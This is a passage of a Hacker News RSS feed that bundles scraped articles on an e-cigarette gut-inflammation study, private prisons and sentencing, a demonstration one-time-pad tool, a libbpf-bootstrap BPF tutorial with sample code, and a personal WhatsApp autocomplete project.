href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=OTJkNjJiOThmYWFlYjE5ZmE4MTZkMDZmYmQ5ZTY3MTdiZWI0MzA0YywyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">HUMANOID Center of Research Excellence</a>.</i></p><p>They noted that epithelial tight conjunction markers, which are zipper-like proteins that form the gut’s first physical barrier, began to break or loosen, causing pathogens from the vapor to seep into the surrounding immune system, wreaking havoc on protective epithelial cells that lie just beneath. </p><p>Such cells act as a defense against infection by clearing pathogenic microbes and initiating certain immune responses in the body. When exposed to the e-cigarette liquid, the cells were quickly overwhelmed, unable to effectively clear pathogens, resulting in gut inflammation. </p><p>The study is part of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedschool.ucsd.edu%2Fresearch%2Finm%2Fhumanoid%2FPages%2Fdefault.aspx&amp;t=OGVlNDI2NmI5NTAxMTYzYzg1M2VjNTI0MTNmMTExYWE5OWEyMzFkMiwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">HUMANOID Center of Research Excellence</a>, a core facility based at UC San Diego School of Medicine led by Ghosh and Das who was senior author of the study. Scientists at the center use a variety of human organoids and other tools to model diseases and effects.</p><p>“This is the first study that demonstrates how chronic exposure to e-cigarettes increases the gut’s susceptibility to bacterial infections, leading to chronic inflammation and other health concerns,” said Das. “Given the importance of the gut barrier in the maintenance of the body’s immune homeostasis, the findings provide valuable insight into the potential long-term harmful effects chronic use of e-cigarettes on our health.” </p><p>Ghosh said damage to the gut lining may be reversible over time if the inciting factor, in this case e-cigarette use, is eliminated, but the effects of chronic inflammation upon other organs, such as the heart or brain, may be irreversible. In the future, Ghosh said she and colleagues plan to look at different flavorings of e-cigarettes to determine what effects they might have on the gut. </p><p>Additional study co-authors include: Aditi Sharma, Jasper Lee, Ayden G. Fonseca, Alex Moshensky, Taha Kothari, Ibrahim M. Sayed, Stella-Rita Ibeawuchi, Rama F. Pranadinata, Jason Ear, and Debashis Sahoo, all at UC San Diego. </p><p>This research was funded, in part, by the National Institutes of Health (DK107585, AI141630, and HL147326) and the University of California Office of the President — Tobacco-Related Disease Research Program (28IP-0024, 30IP-0965 and 26IP-0040).</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=OTJkNjJiOThmYWFlYjE5ZmE4MTZkMDZmYmQ5ZTY3MTdiZWI0MzA0YywyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">University of California San Diego (UC San Diego)</a></b></p><p><b>Full research:</b>&nbsp;“E-cigarettes compromise the gut barrier and trigger inflammation”, <i>iScience</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.isci.2021.102035&amp;t=MDcwNTQyYzQzNWRmN2JlZjcyYjgyNzcyODUzZDdkNDY0MjQzNTA4MywyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610355519">https://doi.org/10.1016/j.isci.2021.102035</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/635162930879594496/smoking-and-covid19">Study: How smoking worsens COVID-19 infection in the airways</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/smoking">smoking</a>
                                    
                                        <a href="https://nuadox.com/tagged/toxicology">toxicology</a>
                                    
                                        <a href="https://nuadox.com/tagged/ecigarettes">ecigarettes</a>
                                    
                                        <a href="https://nuadox.com/tagged/vaping">vaping</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/gut">gut</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690888</guid>
            <pubDate>Fri, 08 Jan 2021 21:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[States with private prisons put more people in prison for longer]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690796">thread link</a>) | @mike_h
<br/>
January 8, 2021 | https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/ | <a href="https://web.archive.org/web/*/https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="articleBody"><p dir="ltr">U.S. states that rely on private prisons incarcerate more people for longer periods of time, according to a first-of-its-kind study that establishes a causal connection between private prisons and incarceration.Â&nbsp;</p><p dir="ltr">The <a href="https://www.sciencedirect.com/science/article/abs/pii/S0927537120301123">paper</a>, published in the December issue of <em>Labour Economics</em>, adds to researchersâ€™ understanding of financial incentives in the criminal justice system, according to authors Gregmar Galinato and Ryne Rohla, both economists at Washington State University.</p><p dir="ltr">The researchers found that states that opened private prisons saw a 4% jump in prison population, or an average of between 6 and 37 extra prisoners per million residents, based on a review of data from 1989 to 2008. Incarcerating those extra people cost states an extra $1.9 million to $10.6 million per year if all additional prisoners were housed in private prisons.</p><p dir="ltr">Galinato and Rohla found that the growth in prison population experienced by states with private prisons was caused by an increase in the number of people being sent to prison, as well as judges handing down longer sentences for particular crimes.Â&nbsp;</p><p dir="ltr">Specifically, a 1% increase in private prison beds per capita will increase sentencing lengths for regulatory offenses by 29 days, weapons offenses by 13 days, drug offenses by 7 days and fraud offenses by 2 days, the researchers found.Â&nbsp;</p><p dir="ltr">However, those figures might underestimate the actual amount of time incarcerated people spend in private prisons, the researchers added, pointing to a 2019 <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2523238">paper</a> by Wisconsin School of Business professor Anita Mukherjee that found that private prison inmates in Mississippi served a full three months longer than people convicted of the same crimes who were sent to public prisons. Mukherjee attributed the lengthier time served to the fact that conduct violations, which can tack extra time onto prisonersâ€™ sentences, are more common in private prisons than in public ones.Â&nbsp;</p><p dir="ltr">While Galinato and Rohla found that people convicted of weapons and drug offenses saw harsher sentences in states with more private prison beds, sentencing for other crimes such as murder did not change.Â&nbsp;</p><p dir="ltr">â€œThat was a good marker for us, because that showed that this wasnâ€™t random noise going on or some correlation,â€� said Galinato of the fact that only some crimes saw a sentencing difference.Â&nbsp;</p><p dir="ltr">In order to establish a causal relationship, the researchers created an instrument called â€œprivatization knowledgeâ€� that indicated academic support for privatization by state from 1989 to 2008. That instrument, which was partially based on the use of words like â€œneoliberalismâ€� in academic journals, corresponded only to the proliferation of private prisons -- not the incarceration rate, the researchers said. Â&nbsp;</p><p dir="ltr">Galinato said that finding an instrument to establish causality was one of the most difficult parts of the project, as the connection between private prisons and incarceration can be self-perpetuating. Developing and using the â€œprivatization knowledgeâ€� instrument took years.Â&nbsp;</p><p dir="ltr">Galinato came up with the idea in 2015, and Rohla began compiling data shortly thereafter. It took about one year to get permission to use Department of Justice data, he said.Â&nbsp;</p><p dir="ltr">In addition to establishing a causal relationship between private prisons and incarceration, Galinato and Rohla also examined two factors that could lead authorities to hand down more and harsher sentences in the first place.Â&nbsp;</p><p dir="ltr">Political corruption could lead politicians to enact stricter laws and cause judges to hand down harsher sentences, the researchers said, pointing to the 2008 â€œkids for cashâ€� <a href="https://nypost.com/2014/02/23/film-details-teens-struggles-in-state-detention-in-payoff-scandal/">scandal</a> in which Pennsylvania judges received kickbacks in exchange for giving juvenile offenders harsher prison sentences.Â&nbsp;</p><p dir="ltr">Judges may also consider prison capacity when sentencing people, Galinato added. â€œIf you have a crowded public system, the judge will say, â€˜OK, this is a marginal person, weâ€™ll probably put them on probation because we donâ€™t want to overcrowd the prison.â€™â€�Â&nbsp;</p><p dir="ltr">However, the researchers did not find a strong enough link to claim that either factor has definitively led to higher incarceration rates at private prisons.Â&nbsp;</p><p dir="ltr">â€œThe best we can say is thereâ€™s a hint,â€� said Galinato. â€œThere could be more mechanisms [affecting incarceration rates] out there.â€�Â&nbsp;</p><p dir="ltr">Rebecca Riddell, the co-director of New York University Law Schoolâ€™s Human Rights and Privatization Project, <a href="https://twitter.com/Rebecca_Riddell/status/1305884832153718785">praised</a> the study on Twitter.</p><p dir="ltr">â€œIt's appalling that private prisons increase incarceration levels,â€� said Riddell. â€œBut should we be surprised? Or is this a foreseeable outcome of creating a powerful industry that profits from every [additional] incarcerated person, takes in billions in taxpayer [dollars] and spends millions lobbying?â€�Â&nbsp;</p><p dir="ltr">Galinato told <em>The Academic TimesÂ&nbsp;</em>that the link between private prisons and incarceration must factor into government policy.Â&nbsp;</p><p dir="ltr">â€œThere is this potential link, and this link becomes more significant if thereâ€™s more corruption and you donâ€™t have oversight,â€� he said, adding that policymakers donâ€™t typically consider that choosing private prisons over public ones increases overall incarceration.Â&nbsp;</p><p dir="ltr">Galinato, who typically works as a natural resource and development economist, said he was inspired to conduct the study when watching an episode of the television show â€œElementary,â€� in which a prison warden murders an inmate in order to appease the owner of a private prison who wants to influence a lobby group.Â&nbsp;</p><p dir="ltr">The idea of private prison companies influencing governments to set harsher sentences initially â€œmade me laugh a little bit in terms of how ludicrous it was,â€� Galinato said.Â&nbsp;</p><p dir="ltr">â€œI wasnâ€™t really aware of private prisons in the U.S.,â€� he added. â€œI come from the Philippines. We don't have them.â€�Â&nbsp;</p><p dir="ltr">His experience studying corruption in relation to natural resources came in handy when examining the criminal justice system, he added.</p><p dir="ltr">In terms of further research, Galinato said he was interested in examining the relationship between private prisons and private halfway houses, which are often owned by the same companies. The owners of halfway houses can set house rules that, if violated, send residents back to prison. That could incentivize halfway houses to set overly harsh rules in order to make more money.Â&nbsp;</p><p dir="ltr">Galinato is also interested in examining private prisonsâ€™ incentive structures, which currently involve significant moral hazard. Private prisons are paid based on how many prisoners they house on a given day, potentially leading them to push for unjustly harsh punishments.Â&nbsp;</p><p dir="ltr">â€œThat kind of contract incentivizes more prisoners and increases the length of stay,â€� said Galinato. â€œWhat if the payment would be based on when they came out of jail and became a better member of society, then the private prison would get a bonus?â€�</p><p dir="ltr"><em>The paper, titled â€œDo privately-owned prisons increase incarceration rates?â€� was first published in the December issue of Labour Economics.Â&nbsp;</em><em>The authors were Gregmar Galinato of Washington State University and Ryne Rohla, who earned a PhD from Washington State University and now works for the Washington State Attorney General's Office. Galinato was lead author.Â&nbsp;</em></p></div></div></div>]]>
            </description>
            <link>https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690796</guid>
            <pubDate>Fri, 08 Jan 2021 21:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decrypt the same ciphertext to different plaintexts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690564">thread link</a>) | @_wldu
<br/>
January 8, 2021 | https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts | <a href="https://web.archive.org/web/*/https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/62726164/padder">Padder</a> can encrypt and decrypt small messages using <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pads</a>. It can also generate fake pads so that one encrypted message can be decrypted to multiple, different plaintexts.</p><h2 id="warning">Warning</h2><p>Padder should not be used in real-world situations that require encryption. It’s only intended for demonstration and experimentation. If you need strong message encryption, do not use padder. Use a well-regarded, open-source OpenPGP implementation such as <a href="https://gnupg.org/">GnuPG</a>.</p><h2 id="the-padder-character-set">The padder character set</h2><div><pre><code data-lang="bash">abcdefghijklmnopqrstuvwxyz0123456789-
</code></pre></div><h2 id="encrypt-a-message">Encrypt a message</h2><div><pre><code data-lang="bash">$ padder -e -m black -p e7vwd
CipherText: fhvyn
</code></pre></div><h2 id="decrypt-a-message">Decrypt a message</h2><div><pre><code data-lang="bash">$ padder -d -m fhvyn -p e7vwd
PlainText: black
</code></pre></div><h2 id="fake-message-and-pad-generation">Fake message and pad generation</h2><div><pre><code data-lang="bash">$ padder -f -m white -c fhvyn
FakePad: uanfj
</code></pre></div><h2 id="message-transmission">Message transmission</h2><p>The padder character set was selected specifically for message transmission over radio (HF, VHF, UHF). However, messages can be transmitted in other ways. Twitter, text messages, phone calls and website forums could all be used to send and receive messages. Encrypted messages could also be embedded in image tags, HTML, or some other inconspicuous place.</p><h2 id="decrypt-the-same-ciphertext-to-multiple-plaintexts">Decrypt the same ciphertext to multiple plaintexts</h2><p>The same one-time pad ciphertext can be decrypted to different plaintext messages by using different pads. This feature is useful for creating diversions. It may also provide for plausible deniability. This requires two (or more) sets of pads.</p><div><pre><code data-lang="bash">$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p ryxrvqnlhz04icqq6eg56cuhg10vlx5dff3ba44wg6ic-kd
PlainText: we-are-moving-north-and-will-attack-at-the-pass

$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p zifs6d9dgk36k94m9d5x77jhj277ip59gw9btmv4j7in-kc
PlainText: our-group-fled-south-to-the-city-we-sailed-east
</code></pre></div><h2 id="security-considerations-and-precautions">Security considerations and precautions</h2><p>Pads must be random, kept secret, only used once and destroyed immediately after use. Should the same pad be used to encrypt more than one message, those messages will be cracked. Should the pads become lost or stolen, then all the messages should be suspect.</p><p>You must assume that your opponent intercepts and stores all of your ciphertext messages indefinitely. They hope to somehow obtain the pads and decrypt the messages someday.</p><p>When used with appropriate procedures and precautions, one-time pad encrypted messages cannot be cracked. However, how the ciphertext message is sent and received may identify the communicating parties. This may or may not be an acceptable risk in your environment. For example, if a person posted a padder encrypted message to a Twitter account, the IP address, user name and date/time would be logged and stored. And, any IP address that read the message would be logged and stored too. Basically, any transmission method that uses a network (cellular, IP, etc.) may quickly reveal the location of the communicating parties.</p><p>Radio signals are directional and can be tracked. However, radio signals don’t rely on network infrastructure and require more expensive equipment and greater technical knowledge to track. With radio you only know the general time and direction from which the signal emanated. Also, it’s relatively easy to hide the source of radio signals when the transmitter is moving around in densely populated areas. The reception of radio signals cannot be tracked. Stations in range of the signal may relay the messages to stations out of range.</p><h2 id="notes">Notes</h2><ul><li><p>Plaintext messages, pads and ciphertext messages must only contain characters from the Padder Character Set. Capitalization, punctuation and spaces are not allowed. When creating plaintext messages, use the dash symbol ‘-’ rather than spaces to separate words. <strong>this-is-an-example-plaintext-message</strong></p></li><li><p>The pad must be as long or longer than the message. The sender and receiver should have the same numbered list of pads and know in which order to use them. There could be 31 pads for the month of January. The January 1st message would use pad number 1 for that day’s message.</p></li><li><p>One-time pad encrypted messages are not authenticated.</p></li><li><p>Padder is only intended for educational purposes and experimentation.</p></li></ul><ul><li><a href="https://www.go350.com/tags/encryption">encryption</a></li></ul></div></div>]]>
            </description>
            <link>https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690564</guid>
            <pubDate>Fri, 08 Jan 2021 21:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LemonIt the Hacker News of YouTube]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25690466">thread link</a>) | @CrazyCoder94
<br/>
January 8, 2021 | https://lemonit.online/blog.html | <a href="https://web.archive.org/web/*/https://lemonit.online/blog.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lemonit.online/blog.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690466</guid>
            <pubDate>Fri, 08 Jan 2021 21:02:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building BPF applications with libbpf-boostrap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690449">thread link</a>) | @based2
<br/>
January 8, 2021 | https://nakryiko.com/posts/libbpf-bootstrap/ | <a href="https://web.archive.org/web/*/https://nakryiko.com/posts/libbpf-bootstrap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p>Get started with your own BPF application quickly and painlessly with
<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a> scaffolding,
which takes care of all the mundane setup steps and lets you dive right into
BPF fun and minimize the necessary boilerplate. We'll take a look at what
libbpf-bootstrap provides and how everything is tied together.</p>

<p>BPF is an amazing kernel technology, which allows anyone to take a pick
under the cover of how kernel functions without intense kernel development
experience and without spending tons of time to set things up for the kernel
development. BPF also eliminates the risk of crashing your OS while doing that.
Once you get up to speed with BPF, it's lots of fun and power in your hands.</p>
<p>But getting started with BPF can still be intimidating in a large part because
setting up a build workflow for even a simple "Hello, World"-like BPF
application requires a bunch of steps that could be frustrating and
intimidating for the new BPF developer. It's not really all that complicated,
but knowing the necessary steps is an (unnecessarily) hard part which probably
demotivates a lot of people from even trying, despite all the interest in and
promise of BPF.</p>
<p><a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a> is
a scaffolding playground setting up as much things as possible for beginner
users to let them dive straight into writing BPF programs and tinkering with
them without unnecessary frustrations of initial setup. It takes into account
best practices developed in BPF community over last few years and provides
a modern and convenient workflow with, arguably, best BPF user experience to
date. libbpf-bootstrap is relying on <a href="https://github.com/libbpf/libbpf">libbpf</a>
and uses a simple Makefile. For users needed more advanced set ups, it should
be a good starting point. At the very least, if Makefile can't be used
directly, it's simple enough to just transfer the logic to whichever build
system needs to be used.</p>
<p>libbpf-bootstrap currently has two demo BPF applications available: <code>minimal</code>
and <code>bootstrap</code>. <code>minimal</code> is exactly that – the most minimal BPF application
that compiles, loads, and runs a simple BPF equivalent of <code>printf("Hello, World!")</code>. Being the most minimal one, it also doesn't impose many
requirements on Linux kernel recentness and should run fine on quite old
kernel versions.</p>
<p><code>minimal</code> is great for quick experimentation and trying things out locally,
but it's not set up to reflect the setup of a production-intended BPF-based
application deployable across a variety of kernels. <code>bootstrap</code> is such an
example. <code>bootstrap</code> demo shows off a real-world approach to building out
minimal, but fully functional and <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">portable</a>
BPF application. To that end, it does rely on <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF CO-RE</a>
and kernel <a href="https://nakryiko.com/posts/btf-dedup/">BTF</a> support, so make sure that your Linux
kernel is built with <code>CONFIG_DEBUG_INFO_BTF=y</code> Kconfig. See <a href="https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere">libbpf
README</a>
for the list of Linux distributions that have everything already setup for you.
If you'd like to minimize the hassle of building custom kernel, just stick
with the recent enough versions of any of the major Linux distros.</p>
<p>Additionally, <code>bootstrap</code> demonstrates BPF global variables usage (Linux 5.5+)
and <a href="https://nakryiko.com/posts/bpf-ringbuf">BPF ring buffer</a> use (Linux 5.8+). Neither of those
features are mandatory to build useful BPF application, but they bring huge
usability improvements and are the way that modern BPF application are built,
so I've added example of using them into a basic <code>bootstrap</code> example.</p>

<p>BPF is a very dynamic technology that is constantly being developed and
evolved. This means that new features and capabilities are added all the time,
so depending on which of them you need, you might need newer kernel versions.
But BPF community takes backwards compatibility extremely seriously, which
means that old Linux kernels will still run BPF applications just fine,
provided you don't need the very latest feature sets. So the simpler and more
conservative your BPF application logic and feature set is, the higher the
chances are that you'll be able to run your BPF application on old kernels.</p>
<p>Having said that, BPF user experience gets better all the time and BPF in more
recent kernel versions provide profound improvements in BPF usability, so if
you are just getting started and don't have a strict requirements to support
outdated Linux kernel versions, make your life less painful and use the latest
kernel version you can get your hands on.</p>
<p>BPF program code is normally written in the C language with some code
organization conventions added to let <a href="https://github.com/libbpf/libbpf">libbpf</a>
make sense of BPF code structure and load properly hand everything into the
kernel. <a href="https://clang.llvm.org/">Clang</a> is the compiler used for BPF code
compilation and it's generally recommended to use the latest Clang you can.
Still, Clang 10 or newer should work fine for most BPF features, but some more
advanced <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF CO-RE</a> features might require
Clang 11 or even 12 (e.g., for some of the more recent and  advanced CO-RE
relocation built-ins).</p>
<p>libbpf-bootstrap bundles with it libbpf (as a Git submodule) and bpftool (for
x86-64 architecture only) to avoid dependency on any specific (and potentially
outdated) versions available in your Linux distribution. Your system should
also have <code>zlib</code> (<code>libz-dev</code> or <code>zlib-devel</code> package) and <code>libelf</code>
(<code>libelf-dev</code> or <code>elfutils-libelf-devel</code> package) installed. Those are
dependencies of <code>libbpf</code> necessary to compile and run it properly.</p>
<p>This is not a primer on BPF technology itself, so some familiarity with basic
concepts like BPF program, BPF map, BPF hooks (attach points) are assumed. If
you need a refresher on BPF fundamentals, <a href="https://docs.cilium.io/en/latest/bpf/">these</a>
<a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">resources</a>
should be a good starting point.</p>
<p>In the rest of this post I'll walk you through the structure of
<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a>, its Makefile
and both <code>minimal</code> and <code>bootstrap</code> examples. We'll look at libbpf conventions
and structuring BPF C code for use with libbpf as a BPF program loader, as well
as how to interact with your BPF programs from the user-space using libbpf
APIs.</p>

<p>Here's the contents of the <a href="https://github.com/libbpf/libbpf-bootstrap"><code>libbpf-bootstrap</code></a>
repository:</p>
<pre><code><span>$ tree
.
├── libbpf
│   ├── ...
│   ... 
├── LICENSE
├── README.md
├── src
│   ├── bootstrap.bpf.c
│   ├── bootstrap.c
│   ├── bootstrap.h
│   ├── Makefile
│   ├── minimal.bpf.c
│   ├── minimal.c
│   ├── vmlinux_508.h
│   └── vmlinux.h -&gt; vmlinux_508.h
└── tools
    ├── bpftool
    └── gen_vmlinux_h.sh

16 directories, 85 files
</span></code></pre>
<p><code>libbpf-bootstrap</code> bundles libbpf as a submodule in <code>libbpf/</code> sub-directory to
avoid depending on system-wide libbpf availability and version.</p>
<p><code>tools/</code> contains <code>bpftool</code> binary, which is used to build <a href="https://nakryiko.com/posts/bcc-to-libbpf-howto-guide/#bpf-skeleton-and-bpf-app-lifecycle">BPF
skeletons</a>
of your BPF code. Similarly to libbpf, it's bundled to avoid depending on
system-wide bpftool availability and its version being sufficiently
up-to-date.</p>
<p>Additionally, bpftool can be used to generate your own <code>vmlinux.h</code> header
with all the Linux kernel type definitions. Chances are you won't need to do
that because libbpf-bootstrap already provides pre-generated
<a href="https://raw.githubusercontent.com/libbpf/libbpf-bootstrap/master/src/vmlinux_508.h">vmlinux.h</a>
in <code>src/</code> sub-directory. It is based on default kernel config for Linux 5.8
with a bunch of extra BPF-related functionality enabled. This means it should
have lots of commonly needed kernel types and constants already. Due to <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF
CO-RE</a>, <code>vmlinux.h</code> doesn't have to match
your kernel configuration and version exactly. But if nevertheless you do need to
generate your custom <code>vmlinux.h</code>, feel free to check
<a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/tools/gen_vmlinux_h.sh"><code>tools/gen_vmlinux_h.sh</code></a>
script to see how it can be done.</p>
<p>Beyond self-explanatory <code>LICENSE</code> and <code>README.md</code> the rest of <code>libbpf-bootstrap</code>
is contained in a <code>src/</code> sub-directory.</p>
<p><a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/src/Makefile">Makefile</a>
defines the necessary build rules to compile all the supplied (and your
custom ones) BPF apps. It follows a simple file naming convention:</p>
<ul>
<li><code>&lt;app&gt;.bpf.c</code> files are the BPF C code that contain the logic which is to
be executed in the kernel context;</li>
<li><code>&lt;app&gt;.c</code> is the user-space C code, which loads BPF code and interacts with
it throughout the lifetime of the application;</li>
<li><em>optional</em> <code>&lt;app&gt;.h</code> is a header file with the common type definitions and
is shared by both BPF and user-space code of the application.</li>
</ul>
<p>So, <code>minimal.c</code> and <code>minimal.bpf.c</code> form the <code>minimal</code> BPF demo app. And
<code>bootstrap.c</code>, <code>bootstrap.bpf.c</code>, and <code>bootstrap.h</code> are the <code>bootstrap</code> BPF
app. Simple.</p>

<p><code>minimal</code> is a good example to start with. Consider it a minimalistic
playground for trying BPF things out. It doesn't use BPF CO-RE, so you can use
older kernels and just include your system kernel headers for kernel type
definitions. It's not the best approach for building production-ready
applications and tools, but is good enough for local experimentation.</p>
<h2 id="the-bpf-side">The BPF side</h2>
<p>Here's the BPF-side code 
(<a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/src/minimal.bpf.c">minimal.bpf.c</a>)
<em>in its entirety</em>:</p>
<pre><code><span>// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
</span><span>#include </span><span>&lt;linux/bpf.h&gt;
</span><span>#include </span><span>&lt;bpf/bpf_helpers.h&gt;

</span><span>char</span><span> LICENSE[] </span><span>SEC(</span><span>"license"</span><span>) </span><span>= </span><span>"Dual BSD/GPL"</span><span>;

</span><span>int</span><span> my_pid </span><span>= </span><span>0</span><span>;

</span><span>SEC</span><span>(</span><span>"tp/syscalls/sys_enter_write"</span><span>)
</span><span>int </span><span>handle_tp</span><span>(</span><span>void </span><span>*</span><span>ctx</span><span>)
{
	</span><span>int</span><span> pid </span><span>= </span><span>bpf_get_current_pid_tgid() </span><span>&gt;&gt; </span><span>32</span><span>;

	</span><span>if </span><span>(pid </span><span>!=</span><span> my_pid)
		</span><span>return </span><span>0</span><span>;

	</span><span>bpf_printk(</span><span>"BPF triggered from PID </span><span>%d</span><span>.\n"</span><span>, pid)</span><span>;

	</span><span>return </span><span>0</span><span>;
}
</span></code></pre>
<p><code>#include &lt;linux/bpf.h&gt;</code> includes some basic BPF-related types and constants
necessary for using the kernel-side BPF APIs (e.g., BPF helper function
flags). This header is needed for the <code>bpf_helpers.h</code> header, included next.
<code>bpf_helpers.h</code> is provided by <code>libbpf</code> and contains most-often used macros,
constants, and BPF helper definitions, which are used by virtually every
existing BPF application. <code>bpf_get_current_pid_tgid()</code> above is an example of
such BPF helper.</p>
<p><code>LICENSE</code> variable defines the license of your BPF code. Specifying the
license is mandatory and is enforced by the kernel. Some BPF functionality is
unavailable to non-GPL-compatible code. Note the special <code>SEC("license")</code>
annotation. <code>SEC()</code> (provided by <code>bpf_helpers.h</code>) puts variables and functions
into the specified sections. <code>SEC("license")</code>, along some other section names,
is the convention dictated by <code>libbpf</code>, so make sure you stick to it.</p>
<p>Next, we see the use of an exciting BPF feature: global variables. <code>int my_pid = 0;</code> does exactly what you'd expect: it defines a global variable which BPF
code can read and update just like any user-space C code would do …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nakryiko.com/posts/libbpf-bootstrap/">https://nakryiko.com/posts/libbpf-bootstrap/</a></em></p>]]>
            </description>
            <link>https://nakryiko.com/posts/libbpf-bootstrap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690449</guid>
            <pubDate>Fri, 08 Jan 2021 21:01:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You: A personal auto-complete tool for WhatsApp web (and eventually everything)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25690316">thread link</a>) | @nuwandavek
<br/>
January 8, 2021 | https://vivekaithal.co/posts/you-complete-you/ | <a href="https://web.archive.org/web/*/https://vivekaithal.co/posts/you-complete-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>GitHub Repo : <a href="https://github.com/nuwandavek/you">https://github.com/nuwandavek/you</a></p>
<p><em>You</em> is an auto-completion tool that completes your sentences. It lets you train a generative model that can mimic your personal style over all your text communication. Currently, You trains on WhatsApp chat history, and offers autocomplete suggestions on WhatsApp Web via a Chrome/Firefox extension and a flask server. This can be extended to train and autocomplete on more personal communication apps (Messenger, email, Slack, Twitter, etc.). Everything runs locally and is completely private.</p>
<h2 id="why">Why?</h2>
<p>Most text-based applications we use have some or the other form of aid to help us spell-check words, complete words or even complete sentences. Most primitive ones are based on simply looking up your words against a corpus, determining the most probable word and helping you complete them (spell-checks, Word docs). Intermediate tools use your own data to predict the most frequent bi-gram pairs (mobile keyboards), and advanced tools use neural networks (GMail, Google Docs). Predicting the next word (or token), however, is the most popular way of training a language model model using neural networks. The last couple of years has seen remarkable innovation in the field of NLP using neural networks from Bi-LSTMs to BERT to GPT3. We think the algorithms are already in place for tools to leverage their power and offer delightful personalized predictions - complete all your sentences. :)</p>
